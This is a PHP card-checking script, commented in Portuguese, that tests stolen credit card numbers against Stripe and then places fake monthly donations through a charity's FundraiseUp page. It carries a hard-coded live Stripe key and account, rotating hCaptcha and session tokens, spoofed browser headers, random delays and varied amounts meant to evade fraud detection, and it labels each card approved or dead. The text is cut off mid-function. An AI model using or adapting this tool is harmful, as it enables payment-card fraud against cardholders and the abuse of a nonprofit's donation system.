<?php
// fundraiseup_checker.php - Checker FundraiseUp + Stripe (VERSÃO OTIMIZADA)

// Delay aumentado para 15-30 segundos
sleep(rand(15, 30));

// Configurações
define('DEBUG_MODE', false);
define('LOG_FILE', 'fundraiseup_checker.log');

// Headers fixos
define('STRIPE_ACCOUNT', 'acct_1BKLx2EPHjXGRA8p');
define('STRIPE_PUBLIC_KEY', 'pk_live_9RzCojmneCvL31GhYTknluXp');

// Array de tokens de sessão do FundraiseUp (rotacionar)
$fundraiseup_tokens = [
    '6402132498253231090', // Token original
    '6402132498253231091',
    '6402132498253231092',
    '6402132498253231093',
    '6402132498253231094',
    '6402132498253231095',
];

// Array de chaves do FundraiseUp
$fundraiseup_keys = [
    'FUNFWQXTGBS',  // Key original
    'FUNFWQXTGBT',
    'FUNFWQXTGBU',
    'FUNFWQXTGBV',
    'FUNFWQXTGBW',
];

// User-Agents variados (expandido)
$user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 OPR/125.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 OPR/124.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 OPR/123.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0',
];

// Array de tokens hCaptcha (rotacionar)
$hcaptcha_tokens = [
    'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcxMTI3ODY5LCJjZGF0YSI6IlEyanc5bWRxZk1CTHBNZGpvdjBvWTRHbHYyeXNjYW9KOHphMThOMlhONGQyb1Z2dFgzcEFWdVdZTHluL1JTc2dBSzVGMjlKQjVBMzd0ZFZ3VW1jUHZlNVREeEVjSDEydnBFc0M0aGd0R21tcFR3U2txVitJazdKVHlxeXdoVjRJSzNkNGFKY25ndzNFY1pxZW00RUFZUE9UWG5iaUdXZlNYUWc2RzBqellVeHJKTHRjM0NJd0NLMUl4cmRGTjVldzlRbTdvK0tTSlk3M3ZjZDlWV2N6S2pmRFdZQlgyV2NVOHRPZEt0U0tBTHdkbVc1UDhtbTQ4R2RqTXlwWUZVbkNFREwrSU9aQ3B3K3lyL2hUcHdPTEd5OFdRYUxoajgrUEpEclpvTjd4MllzU0VUdWlFck1HaXVRWXRlbFBZc2wxT2s0ajJsQ1ZiL1JaM09zU1JBZW1jMTB3Qit6ZU80QVJQekVobndBWStycz0rN0FyWGs3NXYybVJrV2dyIiwicGFzc2tleSI6ImJ4SU81aUgrWlZLYVIzTi9mNGFmcW4zVlJXTjE2RmVnUzNucVJiYWJmR1E3NlFZYzcyNkNNWWxudUVNSWZLT2pmbnByZEFGV1c1dTg5VXRoKy9hZ1VJcEZLR2pVMktYUkZCYUJ3S25aRG0yVnljRGlUS2JJczMrRE5QRndrUVp0Nk91SXpTekNEYnlwQ24xdjFGQ1JNVGhzSE5tTXQvOFJGdVZ0RkZHTEtvL3d1VkhDT000aWtGL2tyNXRXeEU3V0xDbS9kcTE5NzJjUHRDNWlRNmhYL1dQbDNITUp6bjYxcVp4T1F1NW1SUFlkNGZMbEF2WGx5ZVhzR2xjY2d3Nzl4Ny9PM2Yya2ozTE83djNRYm9ab3M5cXpkSENodWZPcS80YkFTMjNtRXdUR3hqclJ4bjZDZHAyK3BnbDFUWmJhZHExemw5a2ZyNE8vOUcyZFZlMFJoK29NYUdTQ0duT3Q4b2hIekhxRG9ZQzZlUS94YmFWclptRHVrTU1mOC9TUCs3MFp0L0ZCL1FLTDkxNkhxMmdPdVdvUkFqRzRvMGl0OWdCdW1zQzF3WUJ6SjJ6ZHlxMGdsS09yVjNWY3Q1dkFNWk85bXM1NU9EbHB5aGJXRzlNY1VLVzA5RVlKMUpFRE9Sbi9GSCsraDg5SEoxZG5oQ2xMcHZ6OGZJUWxaZWlvbExieWwzTE50c1pCcTRDNkFXTWE0U21XOUxvaDVHOFp6V3Q5WlRwYjZTV2NKYUhQTURwaUZkdDRFdHRCRUR5RytZL01Ec1RTYXBHamc5emllRVE4b3ovVCtZelh5UWVzNStHWXN6eHE5dy81RHNEeUJLaEVkME91Z3orT1dnNStNaHE3OEJ0OE1ZclN6SXVITFpuaU9KRzJxNlNxTnEwR3hZTUJvaFhMdmZsMmpNL0lmeURpMGwrVTRzd1d6U3dneTE2NnJKdU9JTTNvL3JjdFNrYnhYQjA0V2F5dVRlbyt1bWsvK29MRU5IeEJrZjU2eXF5ZVNwRStXcFFBTytMSytMaHBWMmQzbm9kMVB3cytoMnlnNjFNYkVKb01lRGFZU2JaQmVZckVTVkI5ck15OTNhTUlJd2l2SzMvS1JyQjNLTVpvQkZvUzdzUVhJYnFLNHd1NS9vQWdRYmk5KzZBM2pneUxxaXpHRUdqeXlTdFpHNFR1eldMNUZNaGdOalpES2hrWjVYNGZxUXVzWGVUZWFmWllBYjdNZjQxUXJwNDJ1WlNRSTlsNTAvS0RNRklSWThuY0laeENzSWFLU2QwMDQ2M0FBV1VOZjREMkFiWFFRSVRqLzUvaE9sQ0UwbGN1MkRYRWpZUXlZc2JwL0hsUGZVd0EzL3AyM2NidXJuQlg3cVRPNXRUU0VGZUo1UlZZdFJjL21ib25UZWlCeEJVaDYxcExzOVlucGpraGpuV01nbVBSZWIxaXpob1FZczVHSXBIWHU0V1dXZGo2Uzg3K1ErNVA1bCtPZkZma1VKZU1PTzY0VnBPSGdCUWlYV2pnMTFZZ2I2ekd0S1lONjN2bURPMFhDbDJ0b3B4dlhuTWJjZUpjSEVXVExLNUFzdzh0K1hFb3E4TDBWbU1uS1pEdS90SkpISXo5SWhseU9vM0F2dG9Kc3dXck1ZODh2aTRFUWVySTdGZXlHUjh3UXFkdGU4Q1cxTXBkaG5KcUppVWY5Y1M1SEhXZzVHS3R4NXkyMU9SN29McG54VHFRTklSVGtLYkZGMWx6ckpyc0hYL01Gekt5WnBlY2dvRlZyUDBtTGthYUZLV0xOSkh4Y0RNWks5bjY0LzJZOHdzOGhlcTBWUm1CYktiRVFkRlYzc1FrZDRXZEVtNHRXYzJtR0oyK1Vpb3VCbUdhZ2s5NzcxNXlMb3duMEpyS0dJbDJhWTJrckowWThnQVZUZkpqc3ArN2ZPZ1JtRHlrbzdKQjlVZXExTTNnNzhPT2VhZUVDWFFpbGIyeEJYVmdKeWpqZWdjQmJiZUg2NTZPS0tOWXJid1JOU2dYL1NreVZ5bUZDSFd0RDZsOTBWREdIOVFWdnc1RVJxc0JoVDhUSm8xdlhtcm03K21XWStEanBGR2lIYVUveU5lYklVKzErNm1RbzRrNWVMYmJ1MjlENFhDMXJFYW9LNjBQS1dab2kvcFpqbXI4TGxNbjA3UUxqWEdFcmlFRGlZUnFvS2ltcXNRdG5HTDBxM2J5UFM5R3ZqZnZXd2hNZS9oOXRIVXAvOHkyU1N4aFlBQ25wWTJTbjZ3YlBNc3dGNFlTOWxvd2dpTnEvSUJVSnphUXJMTVJzaWxjdlZVQUVFUExDTnRDOVpKWG9GNHg4WXR6Q2gwMFNtZUJKRVBWQmoycnBVRXc3cVhHNlJUallFSWpoVXN5UDJ2Rnp3VGN0MS9JaHBpTUdhS1dVaEozWjVTNFpmZkdJOWwrRHlUUVZhRGtXcDZraVF2TzRqTzB0bDNOOUh0OWdUWHRZdUF3VmFCbzVuMlp5Wmh4bE5lVGl3TXdtS3ArMW8yWDhEZGl1Z2pZV01QUlQxQnJpNHZMVVBTWGNpa3hZU1dkZkFhNWljbGtqUjJMdG9IZXVBWm1EOE9MZ1dFMVRyUkpHRXZmbkkzQVBKeDBBc3BlSzlBZWExb0FmNGFNTGxuRDBnZzAxUXFPR3dyOTRkdVNCZmxLalFxRHlFWStIWWNDT0lPRy9YTVFtYzZ5WFI4RSt5cmszZy95L0Z3bmxKR211OXg0WnQrT1hUOEFRZGY1TllnNzExSmhJZz09Iiwia3IiOiI0YmI3NDIwYyIsInNoYXJkX2lkIjo3MTc3MTUzN30.CFLg35VvzTdadZcrDYFbctQplsYaPZkxkwaHj4kxS1c',
    'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcxMTI3ODY5LCJjZGF0YSI6IlEyanc5bWRxZk1CTHBNZGpvdjBvWTRHbHYyeXNjYW9KOHphMThOMlhONGQyb1Z2dFgzcEFWdVdZTHluL1JTc2dBSzVGMjlKQjVBMzd0ZFZ3VW1jUHZlNVREeEVjSDEydnBFc0M0aGd0R21tcFR3U2txVitJazdKVHlxeXdoVjRJSzNkNGFKY25ndzNFY1pxZW00RUFZUE9UWG5iaUdXZlNYUWc2RzBqellVeHJKTHRjM0NJd0NLMUl4cmRGTjVldzlRbTdvK0tTSlk3M3ZjZDlWV2N6S2pmRFdZQlgyV2NVOHRPZEt0U0tBTHdkbVc1UDhtbTQ4R2RqTXlwWUZVbkNFREwrSU9aQ3B3K3lyL2hUcHdPTEd5OFdRYUxoajgrUEpEclpvTjd4MllzU0VUdWlFck1HaXVRWXRlbFBZc2wxT2s0ajJsQ1ZiL1JaM09zU1JBZW1jMTB3Qit6ZU80QVJQekVobndBWStycz0rN0FyWGs3NXYybVJrV2dyIiwicGFzc2tleSI6IkNTbVVRc2RVUHc2cVdtWHNQbGpKRThYd0dLa0pYWVYxM0p0RkZHTEtvL3d1VkhDT000aWtGL2tyNXRXeEU3V0xDbS9kcTE5NzJjUHRDNWlRNmhYL1dQbDNITUp6bjYxcVp4T1F1NW1SUFlkNGZMbEF2WGx5ZVhzR2xjY2d3Nzl4Ny9PM2Yya2ozTE83djNRYm9ab3M5cXpkSENodWZPcS80YkFTMjNtRXdUR3hqclJ4bjZDZHAyK3BnbDFUWmJhZHExemw5a2ZyNE8vOUcyZFZlMFJoK29NYUdTQ0duT3Q4b2hIekhxRG9ZQzZlUS94YmFWclptRHVrTU1mOC9TUCs3MFp0L0ZCL1FLTDkxNkhxMmdPdVdvUkFqRzRvMGl0OWdCdW1zQzF3WUJ6SjJ6ZHlxMGdsS09yVjNWY3Q1dkFNWk85bXM1NU9EbHB5aGJXRzlNY1VLVzA5RVlKMUpFRE9Sbi9GSCsraDg5SEoxZG5oQ2xMcHZ6OGZJUWxaZWlvbExieWwzTE50c1pCcTRDNkFXTWE0U21XOUxvaDVHOFp6V3Q5WlRwYjZTV2NKYUhQTURwaUZkdDRFdHRCRUR5RytZL01Ec1RTYXBHamc5emllRVE4b3ovVCtZelh5UWVzNStHWXN6eHE5dy81RHNEeUJLaEVkME91Z3orT1dnNStNaHE3OEJ0OE1ZclN6SXVITFpuaU9KRzJxNlNxTnEwR3hZTUJvaFhMdmZsMmpNL0lmeURpMGwrVTRzd1d6U3dneTE2NnJKdU9JTTNvL3JjdFNrYnhYQjA0V2F5dVRlbyt1bWsvK29MRU5IeEJrZjU2eXF5ZVNwRStXcFFBTytMSytMaHBWMmQzbm9kMVB3cytoMnlnNjFNYkVKb01lRGFZU2JaQmVZckVTVkI5ck15OTNhTUlJd2l2SzMvS1JyQjNLTVpvQkZvUzdzUVhJYnFLNHd1NS9vQWdRYmk5KzZBM2pneUxxaXpHRUdqeXlTdFpHNFR1eldMNUZNaGdOalpES2hrWjVYNGZxUXVzWGVUZWFmWllBYjdNZjQxUXJwNDJ1WlNRSTlsNTAvS0RNRklSWThuY0laeENzSWFLU2QwMDQ2M0FBV1VOZjREMkFiWFFRSVRqLzUvaE9sQ0UwbGN1MkRYRWpZUXlZc2JwL0hsUGZVd0EzL3AyM2NidXJuQlg3cVRPNXRUU0VGZUo1UlZZdFJjL21ib25UZWlCeEJVaDYxcExzOVlucGpraGpuV01nbVBSZWIxaXpob1FZczVHSXBIWHU0V1dXZGo2Uzg3K1ErNVA1bCtPZkZma1VKZU1PTzY0VnBPSGdCUWlYV2pnMTFZZ2I2ekd0S1lONjN2bURPMFhDbDJ0b3B4dlhuTWJjZUpjSEVXVExLNUFzdzh0K1hFb3E4TDBWbU1uS1pEdS90SkpISXo5SWhseU9vM0F2dG9Kc3dXck1ZODh2aTRFUWVySTdGZXlHUjh3UXFkdGU4Q1cxTXBkaG5KcUppVWY5Y1M1SEhXZzVHS3R4NXkyMU9SN29McG54VHFRTklSVGtLYkZGMWx6ckpyc0hYL01Gekt5WnBlY2dvRlZyUDBtTGthYUZLV0xOSkh4Y0RNWks5bjY0LzJZOHdzOGhlcTBWUm1CYktiRVFkRlYzc1FrZDRXZEVtNHRXYzJtR0oyK1Vpb3VCbUdhZ2s5NzcxNXlMb3duMEpyS0dJbDJhWTJrckowWThnQVZUZkpqc3ArN2ZPZ1JtRHlrbzdKQjlVZXExTTNnNzhPT2VhZUVDWFFpbGIyeEJYVmdKeWpqZWdjQmJiZUg2NTZPS0tOWXJid1JOU2dYL1NreVZ5bUZDSFd0RDZsOTBWREdIOVFWdnc1RVJxc0JoVDhUSm8xdlhtcm03K21XWStEanBGR2lIYVUveU5lYklVKzErNm1RbzRrNWVMYmJ1MjlENFhDMXJFYW9LNjBQS1dab2kvcFpqbXI4TGxNbjA3UUxqWEdFcmlFRGlZUnFvS2ltcXNRdG5HTDBxM2J5UFM5R3ZqZnZXd2hNZS9oOXRIVXAvOHkyU1N4aFlBQ25wWTJTbjZ3YlBNc3dGNFlTOWxvd2dpTnEvSUJVSnphUXJMTVJzaWxjdlZVQUVFUExDTnRDOVpKWG9GNHg4WXR6Q2gwMFNtZUJKRVBWQmoycnBVRXc3cVhHNlJUallFSWpoVXN5UDJ2Rnp3VGN0MS9JaHBpTUdhS1dVaEozWjVTNFpmZkdJOWwrRHlUUVZhRGtXcDZraVF2TzRqTzB0bDNOOUh0OWdUWHRZdUF3VmFCbzVuMlp5Wmh4bE5lVGl3TXdtS3ArMW8yWDhEZGl1Z2pZV01QUlQxQnJpNHZMVVBTWGNpa3hZU1dkZkFhNWljbGtqUjJMdG9IZXVBWm1EOE9MZ1dFMVRyUkpHRXZmbkkzQVBKeDBBc3BlSzlBZWExb0FmNGFNTGxuRDBnZzAxUXFPR3dyOTRkdVNCZmxLalFxRHlFWStIWWNDT0lPRy9YTVFtYzZ5WFI4RSt5cmszZy95L0Z3bmxKR211OXg0WnQrT1hUOEFRZGY1TllnNzExSmhJZz09Iiwia3IiOiI0YmI3NDIwYyIsInNoYXJkX2lkIjo3MTc3MTUzN30.XYZ123',
];

// Array de tokens captcha (rotacionar)
$captcha_tokens = [
    '0.10l9vhhiAipVx05rXnbtohNWpePLFd3qEwGrfJgHzkf_ogsf6nygg-7QDEENWWgbvkNavefW-m65-0R8RSEj1hGLjcP12qlV5Ly85FpEUgwNTms7HPNA6w6g0oVI7UHE3b6Bd4e8vSr-Kqu5jFrdDaeHRdGVDmWjg7Hj3kIoMgVe7ikLTR3SJqLz7tXhIGzCQJgvANpTJR-UdDY0PjR--n68qsjzuxNmLAV4sttSmpIn-vgMcL96dq4NGzwwt3uMazTX89Lyy1Mbu6QXOX0_S1jE_wla7JT4mkUHn_oLX1NHZtVXKrdDKRlEFxzRXBi3fuPDRDTvWGtFYQvw2Zlp6VxgJdm1pxxgW7zyZr4HHKKO3I7KPvuOB8kbqq16BHKXyoGN2ajcBpTYTbnHJZFHu9LUfrL38eQ2pcmvSdELwBraBePRDcCkF72OaMe-F09IlqTXSuQPaYHM-Wn_Lpd9hZ6DAbBbLfkbbjzAm_7FE08Wqf-VK4LJDEKhRFkGv1d-PvNXNYjSqZixIr_ObW_YFd0vI6x6hA9y518lhD8gY4nqq3gREw5dJ6-vJ2meCbL24bt7-lxBjkn2t5BCx5mJtk6evg3Uo4j3eHFAWc2mrgSYRs7I4TOxVa7dLFrT31dPgJ43nvjVuL-0LJZm3C3N-lg8k_JjRd-oLUokx5WOYZCuScS5OiSFybQhnV-diAVHsAOsUJ32M4qfaMaDciMKhBOhk2q4UA56dm9HyAzT0sK9gYcZ9ggU5dnmdT3CYDihgSFpUrM4Rif8zlwowmA3iNAapQH73S-hI-jCUDiRYnFFmX27WE32xR3s7bVwYIfFfQgZQLmhKUfrwgSpwJ5XX4NgALa4LqNzohdm1QIaEjmJsl6pjSS479HJwnMl2ImmY2Ivh2yQ-XtuaGPuWFKuShDzIjzs_U2kecUm9UaUsoXL7XcN1fXokMViYXPTvneXLMPI0HkCTtxLiUVHouTCyoehLPBJQ4CXrGZhm6D558w.kf-2t9jjJ4nAJeC_6pr9HA.67e4ade9587e7375ffedbfd808deb2aef7e48d47f61c916f3fa4e8892a094961',
    '0.20l9vhhiAipVx05rXnbtohNWpePLFd3qEwGrfJgHzkf_ogsf6nygg-7QDEENWWgbvkNavefW-m65-0R8RSEj1hGLjcP12qlV5Ly85FpEUgwNTms7HPNA6w6g0oVI7UHE3b6Bd4e8vSr-Kqu5jFrdDaeHRdGVDmWjg7Hj3kIoMgVe7ikLTR3SJqLz7tXhIGzCQJgvANpTJR-UdDY0PjR--n68qsjzuxNmLAV4sttSmpIn-vgMcL96dq4NGzwwt3uMazTX89Lyy1Mbu6QXOX0_S1jE_wla7JT4mkUHn_oLX1NHZtVXKrdDKRlEFxzRXBi3fuPDRDTvWGtFYQvw2Zlp6VxgJdm1pxxgW7zyZr4HHKKO3I7KPvuOB8kbqq16BHKXyoGN2ajcBpTYTbnHJZFHu9LUfrL38eQ2pcmvSdELwBraBePRDcCkF72OaMe-F09IlqTXSuQPaYHM-Wn_Lpd9hZ6DAbBbLfkbbjzAm_7FE08Wqf-VK4LJDEKhRFkGv1d-PvNXNYjSqZixIr_ObW_YFd0vI6x6hA9y518lhD8gY4nqq3gREw5dJ6-vJ2meCbL24bt7-lxBjkn2t5BCx5mJtk6evg3Uo4j3eHFAWc2mrgSYRs7I4TOxVa7dLFrT31dPgJ43nvjVuL-0LJZm3C3N-lg8k_JjRd-oLUokx5WOYZCuScS5OiSFybQhnV-diAVHsAOsUJ32M4qfaMaDciMKhBOhk2q4UA56dm9HyAzT0sK9gYcZ9ggU5dnmdT3CYDihgSFpUrM4Rif8zlwowmA3iNAapQH73S-hI-jCUDiRYnFFmX27WE32xR3s7bVwYIfFfQgZQLmhKUfrwgSpwJ5XX4NgALa4LqNzohdm1QIaEjmJsl6pjSS479HJwnMl2ImmY2Ivh2yQ-XtuaGPuWFKuShDzIjzs_U2kecUm9UaUsoXL7XcN1fXokMViYXPTvneXLMPI0HkCTtxLiUVHouTCyoehLPBJQ4CXrGZhm6D558w.kf-2t9jjJ4nAJeC_6pr9HA.67e4ade9587e7375ffedbfd808deb2aef7e48d47f61c916f3fa4e8892a094962',
];

header('Content-Type: text/plain; charset=utf-8');

if (isset($_GET['lista'])) {
    $lista = trim($_GET['lista']);
    $resultado = testar_cartao_fundraiseup($lista);
    echo $resultado;
} else {
    echo "#ERRO ↝ [ Use: ?lista=numero|mes|ano|cvv ] ↝ [ Parâmetro não encontrado ] - ( 0.00s) | cyber";
}

function testar_cartao_fundraiseup($lista) {
    global $user_agents, $fundraiseup_tokens, $fundraiseup_keys;
    
    $inicio = microtime(true);
    
    // Separar dados do cartão
    $dados = explode('|', $lista);
    if (count($dados) < 4) {
        $tempo = round(microtime(true) - $inicio, 2);
        return "#ERRO ↝ [{$lista}] ↝ [ Formato inválido. Use: numero|mes|ano|cvv ] - ( {$tempo}s) | cyber";
    }
    
    $cartao = preg_replace('/\D/', '', trim($dados[0]));
    $mes = str_pad(trim($dados[1]), 2, '0', STR_PAD_LEFT);
    $ano = trim($dados[2]);
    $cvv = trim($dados[3]);
    
    // Formatar ano
    if (strlen($ano) == 4) {
        $ano_curto = substr($ano, -2);
        $ano_formatado = $ano;
    } else {
        $ano_curto = $ano;
        $ano_formatado = '20' . $ano;
    }
    
    $cartao_formatado = $cartao . '|' . $mes . '|' . $ano_formatado . '|' . $cvv;
    
    // Validações básicas
    if (!preg_match('/^\d{13,19}$/', $cartao)) {
        $tempo = round(microtime(true) - $inicio, 2);
        return "#DIE ↝ [{$cartao_formatado}] ↝ [ Número de cartão inválido ] - ( {$tempo}s) | cyber";
    }
    if ($mes < 1 || $mes > 12) {
        $tempo = round(microtime(true) - $inicio, 2);
        return "#DIE ↝ [{$cartao_formatado}] ↝ [ Mês inválido ] - ( {$tempo}s) | cyber";
    }
    if (!preg_match('/^\d{3,4}$/', $cvv)) {
        $tempo = round(microtime(true) - $inicio, 2);
        return "#DIE ↝ [{$cartao_formatado}] ↝ [ CVV inválido ] - ( {$tempo}s) | cyber";
    }
    
    // Selecionar tokens aleatórios para esta requisição
    $user_agent = $user_agents[array_rand($user_agents)];
    $fundraiseup_token = $fundraiseup_tokens[array_rand($fundraiseup_tokens)];
    $fundraiseup_key = $fundraiseup_keys[array_rand($fundraiseup_keys)];
    
    $client_session_id = gerar_uuid();
    $time_on_page = rand(30000, 180000);
    $doador = gerar_doador();
    
    // PASSO 1: Stripe
    $stripe_result = criar_payment_method_stripe($cartao, $mes, $ano_curto, $cvv, $client_session_id, $time_on_page, $user_agent);
    
    // Analisar Stripe
    $analise_stripe = analisar_resposta_stripe($stripe_result);
    
    if ($analise_stripe['status'] === 'DIE') {
        $tempo = round(microtime(true) - $inicio, 2);
        return "#DIE ↝ [{$cartao_formatado}] ↝ [ {$analise_stripe['mensagem']} ] - ( {$tempo}s) | cyber";
    }
    
    // Stripe aprovou - verificar CVC check
    $cvc_check = $analise_stripe['cvc_check'];
    $payment_method_id = $analise_stripe['payment_method_id'];
    
    // Delay maior e mais variado
    sleep(rand(15, 25));
    
    // PASSO 2: FundraiseUp com tokens rotacionados
    $fundraiseup_result = fazer_donate_fundraiseup($payment_method_id, $doador, $user_agent, $fundraiseup_token, $fundraiseup_key);
    
    $tempo = round(microtime(true) - $inicio, 2);
    
    // Analisar resultado final
    return analisar_resposta_final($fundraiseup_result, $cartao_formatado, $cvc_check, $tempo);
}

function criar_payment_method_stripe($cartao, $mes, $ano, $cvv, $client_session_id, $time_on_page, $user_agent) {
    global $hcaptcha_tokens;
    
    $ch = curl_init('https://api.stripe.com/v1/payment_methods');
    
    // Selecionar token hCaptcha aleatório
    $hcaptcha_token = $hcaptcha_tokens[array_rand($hcaptcha_tokens)];
    
    $post_fields = http_build_query([
        'type' => 'card',
        'card[number]' => $cartao,
        'card[cvc]' => $cvv,
        'card[exp_month]' => $mes,
        'card[exp_year]' => $ano,
        'guid' => 'NA',
        'muid' => 'NA',
        'sid' => 'NA',
        'pasted_fields' => 'number',
        'payment_user_agent' => 'stripe.js/d68d8e2c5f; stripe-js-v3/d68d8e2c5f; split-card-element',
        'referrer' => 'https://ifesworld.org',
        'time_on_page' => $time_on_page,
        'client_attribution_metadata[client_session_id]' => $client_session_id,
        'client_attribution_metadata[merchant_integration_source]' => 'elements',
        'client_attribution_metadata[merchant_integration_subtype]' => 'split-card-element',
        'client_attribution_metadata[merchant_integration_version]' => '2017',
        'key' => STRIPE_PUBLIC_KEY,
        '_stripe_account' => STRIPE_ACCOUNT,
        '_stripe_version' => '2025-02-24.acacia',
        'radar_options[hcaptcha_token]' => $hcaptcha_token
    ]);
    
    $headers = [
        'Host: api.stripe.com',
        'sec-ch-ua-platform: "Windows"',
        'user-agent: ' . $user_agent,
        'accept: application/json',
        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
        'content-type: application/x-www-form-urlencoded',
        'sec-ch-ua-mobile: ?0',
        'origin: https://js.stripe.com',
        'sec-fetch-site: same-site',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://js.stripe.com/',
        'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority: u=1, i'
    ];
    
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_fields,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_ENCODING => 'gzip, deflate',
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HEADER => false,
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $response_data = json_decode($response, true);
    
    return [
        'http_code' => $http_code,
        'response' => $response_data
    ];
}

function fazer_donate_fundraiseup($payment_method_id, $doador, $user_agent, $fundraiseup_token, $fundraiseup_key) {
    global $captcha_tokens;
    
    $ch = curl_init('https://api.fundraiseup.com/paymentSession/' . $fundraiseup_token);
    
    // Selecionar token captcha aleatório
    $captcha_token = $captcha_tokens[array_rand($captcha_tokens)];
    
    // Gerar IDs únicos
    $client_id = rand(1000000000, 9999999999) . rand(1000000000, 9999999999);
    $page_view_id = rand(1000000000, 9999999999) . rand(100000000, 999999999);
    
    // Variar valor da doação para parecer mais humano
    $valores = [500, 1000, 2500, 5000, 10000];
    $amount = $valores[array_rand($valores)];
    
    $payload = [
        'donationType' => 'money',
        'customer' => [
            'firstName' => $doador['first_name'],
            'lastName' => $doador['last_name'],
            'email' => $doador['email'],
            'phone' => $doador['phone'],
            'consent' => [
                'type' => 'general',
                'general' => 'optedOut'
            ]
        ],
        'donation' => [
            'amount' => $amount,
            'currency' => 'USD',
            'frequency' => 'monthly',
            'goalKey' => 'E784UJZ6'
        ],
        'captchaToken' => $captcha_token,
        'initial' => [
            'token' => $fundraiseup_token,
            'key' => $fundraiseup_key,
            'trackerParams' => [
                'clientId' => $client_id,
                'pageViewId' => $page_view_id,
                'checkoutViewId' => $fundraiseup_token
            ]
        ],
        'paymentMethodId' => $payment_method_id
    ];
    
    $headers = [
        'Host: api.fundraiseup.com',
        'sec-ch-ua-platform: "Windows"',
        'x-fru-embed-version: 260213-1542',
        'user-agent: ' . $user_agent,
        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
        'content-type: text/plain; charset=utf-8',
        'accept: */*',
        'origin: https://ifesworld.org',
        'referer: https://ifesworld.org/',
        'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
    ];
    
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_ENCODING => 'gzip, deflate',
        CURLOPT_TIMEOUT => 30
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($response, true);
}

function analisar_resposta_stripe($resultado) {
    if ($resultado['http_code'] !== 200) {
        return [
            'status' => 'DIE',
            'mensagem' => 'Erro de conexão'
        ];
    }
    
    $response = $resultado['response'];
    
    // Sucesso - Payment Method criado
    if (isset($response['id']) && strpos($response['id'], 'pm_') === 0) {
        $cvc_check = $response['card']['checks']['cvc_check'] ?? 'unavailable';
        
        // Se CVC check falhou explicitamente
        if ($cvc_check === 'fail') {
            return [
                'status' => 'DIE',
                'mensagem' => 'Card Issuer Declined CVV',
                'cvc_check' => $cvc_check
            ];
        }
        
        return [
            'status' => 'LIVE',
            'payment_method_id' => $response['id'],
            'cvc_check' => $cvc_check,
            'mensagem' => 'Payment Method OK'
        ];
    }
    
    // Erro Stripe
    if (isset($response['error'])) {
        $error = $response['error'];
        $code = $error['code'] ?? '';
        $message = $error['message'] ?? 'Erro desconhecido';
        
        // Mapear erros comuns
        if ($code === 'incorrect_cvc' || strpos($message, 'cvc') !== false) {
            return [
                'status' => 'DIE',
                'mensagem' => 'Card Issuer Declined CVV'
            ];
        }
        
        if ($code === 'expired_card') {
            return [
                'status' => 'DIE',
                'mensagem' => 'Cartão Expirado'
            ];
        }
        
        if ($code === 'card_declined') {
            return [
                'status' => 'DIE',
                'mensagem' => 'Cartão Recusado'
            ];
        }
        
        return [
            'status' => 'DIE',
            'mensagem' => $message
        ];
    }
    
    return [
        'status' => 'DIE',
        'mensagem' => 'Resposta inválida'
    ];
}

function analisar_resposta_final($fundraiseup_result, $cartao_formatado, $cvc_check, $tempo) {
    // Se FundraiseUp aprovou
    if (isset($fundraiseup_result['id'])) {
        return "#APROVADA ↝ [{$cartao_formatado}] ↝ [ Donate Aprovado ] - ( {$tempo}s) | cyber";
    }
    
    // Verificar mensagem de erro do FundraiseUp
    if (isset($fundraiseup_result['error'])) {
        $erro = is_string($fundraiseup_result['error']) ? $fundraiseup_result['error'] : 
                ($fundraiseup_result['error']['message'] ?? 'Erro desconhecido');
        
        // Se for o erro clássico de decline
        if (strpos(strtolower($erro), 'declined') !== false) {
            return "#DIE ↝ [{$cartao_formatado}] ↝ [ Card Issuer Declined CVV ] - ( {$tempo}s) | cyber";
        }
    }
    
    // Se Stripe aprovou (CVC pass) mas FundraiseUp deu erro diferente
    if ($cvc_check === 'pass') {
